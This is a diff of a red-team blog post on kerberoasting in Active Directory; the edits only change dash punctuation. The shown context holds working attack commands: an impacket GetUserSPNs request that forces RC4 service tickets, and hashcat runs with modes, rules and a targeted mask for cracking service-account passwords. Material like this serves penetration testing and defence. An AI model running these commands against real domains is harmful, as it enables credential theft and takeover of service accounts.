@@ -5,10 +5,10 @@ date: 2026-08-02 11:00:00 -0300
 author: v3lkro
 tags: [active-directory, red-team, kerberos, post-exploitation]
 lang: en
-excerpt: "what kerberoasting actually buys you in 2026 — when the trick still works, what defenders catch, and which RC4 mask cracks first."
+excerpt: "what kerberoasting actually buys you in 2026, when the trick still works, what defenders catch, and which RC4 mask cracks first."
 ---
 
-Kerberoasting is ancient by red-team standards: 2014 paper, dozens of tools, every detection product knows the signature. In 2026 it still pays off in roughly 60–70% of the AD environments I've touched, because the underlying configuration mistake — a human-typed password on a service account with an SPN — outlives every detection cycle.
+Kerberoasting is ancient by red-team standards: 2014 paper, dozens of tools, every detection product knows the signature. In 2026 it still pays off in roughly 60-70% of the AD environments I've touched, because the underlying configuration mistake, a human-typed password on a service account with an SPN, outlives every detection cycle.
 
 The trick still works the same way. What changed is the noise floor.
 
@@ -35,11 +35,11 @@ Get-ADUser -Filter {ServicePrincipalName -ne "$null"} `
 | 0x8 | AES128_CTS_HMAC_SHA1_96  |
 | 0x10| AES256_CTS_HMAC_SHA1_96  |
 
-If `EncTypes` is unset (`$null`) the DC negotiates per the `Domain Controller` policy — which historically means RC4 is still served. If `EncTypes` is `0x18` (AES-only) you get an AES ticket and your crack rate falls off a cliff.
+If `EncTypes` is unset (`$null`) the DC negotiates per the `Domain Controller` policy, which historically means RC4 is still served. If `EncTypes` is `0x18` (AES-only) you get an AES ticket and your crack rate falls off a cliff.
 
 ## requesting the tickets
 
-`GetUserSPNs.py` from impacket is still the right tool — it asks for a specific encryption type, so you can force RC4 for the cheap crack:
+`GetUserSPNs.py` from impacket is still the right tool, it asks for a specific encryption type, so you can force RC4 for the cheap crack:
 
 ```text
 $ GetUserSPNs.py -dc-ip 10.0.0.1 -request \
@@ -52,14 +52,14 @@ HTTP/spbridge.inferi.local  svc_spbridge   ...       2024-11-04 ...             
 HTTP/jenkins:8080           svc_jenkins    ...       2021-09-20 ...                            none
 ```
 
-The dates are the giveaway. A `PasswordLastSet` from 2018 on a service account named `svc_sql` is a guarantee of a human-typed password — modern infrastructure rotates with gMSA every 30 days.
+The dates are the giveaway. A `PasswordLastSet` from 2018 on a service account named `svc_sql` is a guarantee of a human-typed password, modern infrastructure rotates with gMSA every 30 days.
 
 ## cracking
 
-RC4-HMAC tickets are `-m 13100` in hashcat; AES-256 is `-m 19700`. RC4 is two orders of magnitude faster — start there:
+RC4-HMAC tickets are `-m 13100` in hashcat; AES-256 is `-m 19700`. RC4 is two orders of magnitude faster, start there:
 
 ```bash
-# RC4 first — RTX 4090 does ~3 GH/s
+# RC4 first, RTX 4090 does ~3 GH/s
 $ hashcat -m 13100 spns-rc4.txt rockyou.txt \
           -r rules/best64.rule \
           --status --status-timer=60
@@ -69,7 +69,7 @@ $ hashcat -m 19700 spns-aes.txt rockyou.txt \
           -r rules/best64.rule
 ```
 
-`Password123!` and its variants land in the first three minutes. Anything more interesting needs targeted masks — for service accounts I find `?u?l?l?l?l?l?d?d?d?d` (year-suffix Camelcased word) hits a depressing fraction:
+`Password123!` and its variants land in the first three minutes. Anything more interesting needs targeted masks, for service accounts I find `?u?l?l?l?l?l?d?d?d?d` (year-suffix Camelcased word) hits a depressing fraction:
 
 ```bash
 $ hashcat -m 13100 spns-rc4.txt -a 3 '?u?l?l?l?l?l?d?d?d?d'
